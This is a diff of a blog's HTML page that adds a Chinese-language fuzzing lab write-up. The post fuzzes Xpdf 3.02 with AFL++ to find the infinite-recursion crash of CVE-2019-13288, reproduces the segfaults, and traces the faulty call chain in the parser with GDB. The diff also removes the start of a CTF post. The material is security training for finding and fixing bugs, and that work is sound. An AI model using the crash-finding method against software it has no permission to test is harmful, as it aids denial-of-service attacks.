@@ -156,6 +156,211 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/14/Fuzz%20Lab1-Xpdf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/14/Fuzz%20Lab1-Xpdf/" class="post-title-link" itemprop="url">Fuzz Lab1-Xpdf</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-08-14 12:06:01 / Modified: 13:25:01" itemprop="dateCreated datePublished" datetime="2022-08-14T12:06:01+08:00">2022-08-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>7.6k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>7 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Fuzz-Lab1：Xpdf"><a href="#Fuzz-Lab1：Xpdf" class="headerlink" title="Fuzz-Lab1：Xpdf"></a>Fuzz-Lab1：Xpdf</h2><p>本次实验我们将对 <strong>Xpdf</strong>（一款 PDF 转换解析工具）进行 fuzz，目标是在 <a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2019-13288/"><strong>CVE-2019-13288</strong></a> 中发现一个 crash/PoC </p>
+<ul>
+<li>CVE-2019-13288 是一个漏洞，可能会通过精心制作的 payload 文件导致无限递归</li>
+<li>由于程序中每个被调用的函数都会在栈上分配一个栈帧，如果一个函数被递归调用这么多次，就会导致栈内存耗尽和程序崩溃</li>
+<li>因此，远程攻击者可以利用它进行 DoS 攻击</li>
+</ul>
+<p>学习的目标：</p>
+<ul>
+<li>使用 instrumentation 工具编译目标应用程序</li>
+<li>运行模糊器（afl-fuzz）</li>
+<li>使用调试器（GDB）对崩溃进行分类</li>
+</ul>
+<h2 id="Download-and-build-your-target"><a href="#Download-and-build-your-target" class="headerlink" title="Download and build your target"></a>Download and build your target</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME # 创建目录</span><br><span class="line">mkdir fuzzing_xpdf &amp;&amp; cd fuzzing_xpdf/</span><br><span class="line">sudo apt install build-essential</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line">wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz # 获取xpdf</span><br><span class="line">tar -xvzf xpdf-3.02.tar.gz</span><br><span class="line"></span><br><span class="line">cd xpdf-3.02 # 编译&amp;安装xpdf</span><br><span class="line">sudo apt update &amp;&amp; sudo apt install -y build-essential gcc</span><br><span class="line">./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">cd $HOME/fuzzing_xpdf # 下载一些PDF示例</span><br><span class="line">mkdir pdf_examples &amp;&amp; cd pdf_examples</span><br><span class="line">wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf</span><br><span class="line">wget http://www.africau.edu/images/default/sample.pdf</span><br><span class="line">wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf</span><br></pre></td></tr></table></figure>
+<ul>
+<li>我们可以使用以下命令测试 pdfinfo 二进制文件：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  pdf_examples $HOME/fuzzing_xpdf/install/bin/pdfinfo -box -meta $HOME/fuzzing_xpdf/pdf_examples/helloworld.pdf</span><br><span class="line">Tagged:         no</span><br><span class="line">Pages:          1</span><br><span class="line">Encrypted:      no</span><br><span class="line">Page size:      200 x 200 pts</span><br><span class="line">MediaBox:           0.00     0.00   200.00   200.00</span><br><span class="line">CropBox:            0.00     0.00   200.00   200.00</span><br><span class="line">BleedBox:           0.00     0.00   200.00   200.00</span><br><span class="line">TrimBox:            0.00     0.00   200.00   200.00</span><br><span class="line">ArtBox:             0.00     0.00   200.00   200.00</span><br><span class="line">File size:      678 bytes</span><br><span class="line">Optimized:      no</span><br><span class="line">PDF version:    1.7</span><br></pre></td></tr></table></figure>
+<h2 id="Install-AFL"><a href="#Install-AFL" class="headerlink" title="Install AFL++"></a>Install AFL++</h2><p>在本课程中，我们将使用最新版本的 <a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus">AFL++ fuzzer</a> ，您可以通过两种方式安装所有内容：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update # 安装依赖</span><br><span class="line">sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools</span><br><span class="line">sudo apt-get install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo apt-get install -y lld llvm llvm-dev clang </span><br><span class="line">sudo apt-get install -y gcc-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\..*//&#x27;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\..*//&#x27;)-dev</span><br><span class="line"></span><br><span class="line">cd $HOME # 安装AFL++</span><br><span class="line">git clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplus</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">make distrib</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+<p>AFL 是一个 <strong>coverage-guided fuzzer</strong>，这意味着它为每个变异的输入收集覆盖信息，以发现新的执行路径和潜在的错误</p>
+<ul>
+<li>当源代码可用时，AFL 可以使用插桩，在每个基本块（函数、循环等）的开头插入函数调用</li>
+<li>要想我们的目标应用程序启用检测，我们需要使用 AFL 的编译器编译代码</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_xpdf/install # 清理所有之前编译的目标文件和可执行文件</span><br><span class="line">cd $HOME/fuzzing_xpdf/xpdf-3.02/</span><br><span class="line">make clean</span><br><span class="line"></span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot; # 现在我们将使用afl-clang-fast编译器构建xpdf</span><br><span class="line">CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++ ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在 AFL 编译文件时候 afl-gcc 会在规定位置插入桩代码，可以理解为一个个的探针（但是没有暂停功能），在后续 fuzz 的过程中会根据这些桩代码进行路径探索，测试等</li>
+<li>AFL 通过插桩的形式注入到被编译的程序中，实现对分支（branch、edge）覆盖率的捕获，以及分支节点计数</li>
+</ul>
+<p>我们可以使用以下命令测试 pdfinfo 二进制文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/install/bin/pdftotext @@ $HOME/fuzzing_xpdf/output</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>-i</em> ：表示我们必须放置输入案例的目录（a.k.a 文件示例）</li>
+</ul>
+<ul>
+<li><em>-o</em> ：表示 AFL++ 将存储变异文件的目录</li>
+<li><em>-s</em> ：表示要使用的静态随机种子</li>
+<li><em>@@</em> ：是占位符目标的命令行，AFL 将用每个输入文件名替换</li>
+</ul>
+<img src="/2022/08/14/Fuzz%20Lab1-Xpdf/1660312674524.png" class width="1660312674524">  
+<ul>
+<li>红色的 uniq. crash 值，显示发现的唯一崩溃数</li>
+<li>您可以在 <code>$HOME/fuzzing_xpdf/out/</code> 目录中找到这些崩溃文件</li>
+<li>一旦发现第一次崩溃，您就可以停止模糊器，这是我们将要处理的问题（根据您的机器性能，最多可能需要一到两个小时才能发生崩溃）</li>
+</ul>
+<h2 id="Do-it-yourself"><a href="#Do-it-yourself" class="headerlink" title="Do it yourself!"></a>Do it yourself!</h2><p>为了完成这个练习，你需要：</p>
+<ul>
+<li>用指定的文件重现崩溃</li>
+<li>调试 crash 发现问题</li>
+<li>修复问题</li>
+</ul>
+<p>PS：预计时间 = 120 分钟</p>
+<p>通过上一个部分我们已经获取了两个 crash，在 <code>$HOME/fuzzing_xpdf/out/default/crashes</code> 中可以找到：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes ls</span><br><span class="line">id:<span class="number">000000</span>,sig:<span class="number">11</span>,src:<span class="number">000000</span>+<span class="number">000810</span>,time:<span class="number">45712</span>,execs:<span class="number">44457</span>,op:splice,rep:<span class="number">16</span></span><br><span class="line">id:<span class="number">000001</span>,sig:<span class="number">11</span>,src:<span class="number">000726</span>,time:<span class="number">62396</span>,execs:<span class="number">61755</span>,op:havoc,rep:<span class="number">2</span></span><br><span class="line">README.txt</span><br></pre></td></tr></table></figure>
+<p>在使用 crash 文件进行调试前，我们需要先了解一下 Xpdf</p>
+<h2 id="Xpdf"><a href="#Xpdf" class="headerlink" title="Xpdf"></a>Xpdf</h2><p>Xpdf 是可移植文档格式 (PDF) 文件的开源查看器（这些有时也被称为“Acrobat”文件，来自 Adobe 的 PDF 软件的名称）</p>
+<ul>
+<li>Xpdf 项目还包括 PDF 文本提取器、PDF 到 PostScript 转换器和各种其他实用程序</li>
+<li>Xpdf 在 UNIX、VMS 和 OS/2 上的 X 窗口系统下运行，非 X 组件（pdftops、pdftotext 等）也可以在 Win32 系统上运行，并且应该可以在几乎任何具有像样 C++ 编译器的系统上运行</li>
+<li>Xpdf 被设计为小巧高效，它可以使用 Type 1 或 TrueType 字体</li>
+</ul>
+<p>要运行 Xpdf，只需键入：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xpdf file.pdf</span><br></pre></td></tr></table></figure>
+<p>要生成 PostScript 文件，请点击 xpdf 中的“打印”按钮，或运行 pdftops：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdftops file.pdf</span><br></pre></td></tr></table></figure>
+<p>要生成纯文本文件，请运行 pdftotext：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdftotext file.pdf</span><br></pre></td></tr></table></figure>
+<p>一共有5个实用程序（在他们的手册页中有完整的描述）：</p>
+<ul>
+<li>pdftotext — 通过 PDF 文件生成纯文本文件</li>
+<li>pdfinfo — 转储 PDF 文件的信息字典（加上其他一些有用的信息）</li>
+<li>pdffonts — 列出 PDF 文件中使用的字体以及各种每种字体的信息</li>
+<li>pdftops — 将 PDF 文件转换为一系列 PPM/PGM/PBM 格式位图</li>
+<li>pdfimages — 从 PDF 文件中提取图像</li>
+</ul>
+<h2 id="Reproduce-the-crash"><a href="#Reproduce-the-crash" class="headerlink" title="Reproduce the crash"></a>Reproduce the crash</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp id:000000,sig:11,src:000000+000810,time:45712,execs:44457,op:splice,rep:16 /home/yhellow/fuzzing_xpdf/install/bin </span><br><span class="line">cd /home/yhellow/fuzzing_xpdf/install/bin</span><br><span class="line">mv id:000000,sig:11,src:000000+000810,time:45712,execs:44457,op:splice,rep:16 test.pdf</span><br></pre></td></tr></table></figure>
+<p>依次使用 <code>pdftotext</code> <code>pdfinfo</code> <code>pdffonts</code> <code>pdftops</code> <code>pdfimages</code> 运行测试文件：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdftotext test.pdf </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">[1]    3065 segmentation fault  ./pdftotext test.pdf <span class="comment">/* 段错误 */</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdfinfo test.pdf          </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">Subject:        </span></span><br><span class="line"><span class="function">Keywords:       </span></span><br><span class="line"><span class="function">Author:         Administrator</span></span><br><span class="line"><span class="function">Creator:        PDFCreator 2.0.2.0</span></span><br><span class="line"><span class="function">Producer:       Pator 2.0.2.0</span></span><br><span class="line"><span class="function">CreationDate:   Sun Jul 26 00:25:22 2015</span></span><br><span class="line"><span class="function">ModDate:        Sun Jul 26 00:25:22 2015</span></span><br><span class="line"><span class="function">Tagged:         no</span></span><br><span class="line"><span class="function">Pages:          1</span></span><br><span class="line"><span class="function">Encrypted:      no</span></span><br><span class="line"><span class="function">Page size:      595 x 842 <span class="title">pts</span> <span class="params">(A4)</span></span></span><br><span class="line"><span class="function">File size:      4109 bytes</span></span><br><span class="line"><span class="function">Optimized:      no</span></span><br><span class="line"><span class="function">PDF version:    0.0</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdffonts test.pdf </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">name                                 type              emb sub uni object ID</span></span><br><span class="line"><span class="function">------------------------------------ ----------------- --- --- --- ---------</span></span><br><span class="line"><span class="function">Times-Roman </span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdftops test.pdf        </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">[1]    3141 segmentation fault  ./pdftops test.pdf <span class="comment">/* 段错误 */</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdfimages test.pdf test     </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">[1]    3236 segmentation fault  ./pdfimages test.pdf test <span class="comment">/* 段错误 */</span></span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>其中 <code>pdftotext</code> <code>pdftops</code> <code>pdfimages</code> 出现了段错误</li>
+<li>我们先用 GDB 调试 <code>pdftotext</code>：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb --args ./pdftotext ./test.pdf</span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用 GDB <code>bt</code> 命令来获取栈回溯：</li>
+</ul>
+<img src="/2022/08/14/Fuzz%20Lab1-Xpdf/1660445660783.png" class width="1660445660783"> 
+<ul>
+<li>发现程序的行为异常，不断调用 <code>Object::dictLookup</code> <code>Parser::makeStream</code> <code>Parser::getObj</code> <code>XRef::fetch</code>，程序无限递归最终崩溃（经过测试，<code>pdftops</code> <code>pdfimages</code> 中的段错误也是这个原因）</li>
+</ul>
+<p>我们在 <code>Object::dictLookup</code> <code>Parser::makeStream</code> <code>Parser::getObj</code> <code>XRef::fetch</code> 处打上断点，配合源码用 GDB 单步调试：</p>
+<ul>
+<li>触发断点的顺序如下：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Parser::getObj(若干次) -&gt; Parser::makeStream -&gt; Object::dictLookup -&gt; XRef::fetch</span><br></pre></td></tr></table></figure>
+<ul>
+<li>分析 <code>Parser::makeStream -&gt; Object::dictLookup</code>：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dict-&gt;dictLookup(<span class="string">&quot;Length&quot;</span>, &amp;obj); <span class="comment">/* 正常调用dictLookup */</span></span><br><span class="line"><span class="keyword">if</span> (obj.isInt()) &#123;</span><br><span class="line">  length = (Guint)obj.getInt();</span><br><span class="line">  obj.<span class="built_in">free</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  error(getPos(), <span class="string">&quot;Bad &#x27;Length&#x27; attribute in stream&quot;</span>);</span><br><span class="line">  obj.<span class="built_in">free</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>分析 <code>Object::dictLookup -&gt; XRef::fetch</code>：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> Object *<span class="title">Object::dictLookup</span><span class="params">(<span class="keyword">char</span> *key, Object *obj)</span></span></span><br><span class="line"><span class="function">  </span>&#123; <span class="keyword">return</span> dict-&gt;lookup(key, obj); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Object *<span class="title">Dict::lookup</span><span class="params">(<span class="keyword">char</span> *key, Object *obj)</span> </span>&#123;</span><br><span class="line">  DictEntry *e;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (e = find(key)) ? e-&gt;val.fetch(xref, obj) : obj-&gt;initNull(); <span class="comment">/* 正常调用fetch */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>分析 <code>XRef::fetch -&gt; Parser::getObj</code>：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   parser-&gt;getObj(&amp;obj1); <span class="comment">/* 会调用4次getObj */</span></span><br><span class="line">   parser-&gt;getObj(&amp;obj2);</span><br><span class="line">   parser-&gt;getObj(&amp;obj3);</span><br><span class="line">   <span class="keyword">if</span> (!obj1.isInt() || obj1.getInt() != num ||</span><br><span class="line">!obj2.isInt() || obj2.getInt() != gen ||</span><br><span class="line">!obj3.isCmd(<span class="string">&quot;obj&quot;</span>)) &#123;</span><br><span class="line">     obj1.<span class="built_in">free</span>();</span><br><span class="line">     obj2.<span class="built_in">free</span>();</span><br><span class="line">     obj3.<span class="built_in">free</span>();</span><br><span class="line">     <span class="keyword">delete</span> parser;</span><br><span class="line">     <span class="keyword">goto</span> err;</span><br><span class="line">   &#125;</span><br><span class="line">   parser-&gt;getObj(obj, encrypted ? fileKey : (Guchar *)<span class="literal">NULL</span>,</span><br><span class="line">	   encAlgorithm, keyLength, num, gen);</span><br><span class="line">   obj1.<span class="built_in">free</span>();</span><br><span class="line">   obj2.<span class="built_in">free</span>();</span><br><span class="line">   obj3.<span class="built_in">free</span>();</span><br></pre></td></tr></table></figure>
+<ul>
+<li>分析 <code>Parser::getObj -&gt; Parser::getObj</code>：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">while</span> (!buf1.isCmd(<span class="string">&quot;&gt;&gt;&quot;</span>) &amp;&amp; !buf1.isEOF()) &#123;</span><br><span class="line">     <span class="keyword">if</span> (!buf1.isName()) &#123;</span><br><span class="line">error(getPos(), <span class="string">&quot;Dictionary key must be a name object&quot;</span>);</span><br><span class="line">shift();</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">key = copyString(buf1.getName());</span><br><span class="line">shift();</span><br><span class="line"><span class="keyword">if</span> (buf1.isEOF() || buf1.isError()) &#123;</span><br><span class="line">  gfree(key);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">obj-&gt;dictAdd(key, getObj(&amp;obj2, fileKey, encAlgorithm, keyLength,</span><br><span class="line">			 objNum, objGen)); <span class="comment">/* 多次调用dictAdd,在其中调用getObj */</span></span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>分析 <code>Parser::getObj -&gt; Parser::makeStream</code>：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (allowStreams &amp;&amp; buf2.isCmd(<span class="string">&quot;stream&quot;</span>)) &#123;</span><br><span class="line">  <span class="keyword">if</span> ((str = makeStream(obj, fileKey, encAlgorithm, keyLength,</span><br><span class="line">   objNum, objGen))) <span class="comment">/* 正常调用makeStream */</span></span><br></pre></td></tr></table></figure>
+<p>从整个调用链来看，程序的运行逻辑就是闭合的，可能作者需要这种递归调用来完成一些工作，盲猜作者在涉及调用条件时出现了一些问题：</p>
+<ul>
+<li><code>Parser::makeStream -&gt; Object::dictLookup</code> 和 <code>Object::dictLookup -&gt; XRef::fetch</code> 都是无条件调用，这里应该不会出现问题</li>
+<li><code>XRef::fetch</code> 中调用了4次 <code>getObj</code>，<code>Parser::getObj</code> 中通过多次调用 <code>dictAdd</code> 来调用 <code>getObj</code>，但它们的调用都是有条件的，如果某一次的传入的 <code>Object</code> 结构体设置不对，就可能导致无限调用</li>
+</ul>
+<p>下载 4.02 版本代码，对比 <code>Parser.cc</code>，可以看到此漏洞被修复：</p>
+<img src="/2022/08/14/Fuzz%20Lab1-Xpdf/2308014-20210907124158811-1900620626.png" class title="2308014-20210907124158811-1900620626"> 
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/08/House%20Of%20Cat-2.35-64/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1687,111 +1892,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/21/DSCTF2022/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/07/21/DSCTF2022/" class="post-title-link" itemprop="url">DSCTF2022</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-07-21 11:07:58 / Modified: 11:16:12" itemprop="dateCreated datePublished" datetime="2022-07-21T11:07:58+08:00">2022-07-21</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>3.8k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>3 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>fuzzerinstrospector</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.6</span>)</span> stable release version 2.27</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fuzzerinstrospector: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.6</span>_amd64/ld<span class="number">-2.27</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">719784b</span>3c6cf918a5fc48dea4142aae94c7f4dec, stripped</span><br><span class="line">[*] <span 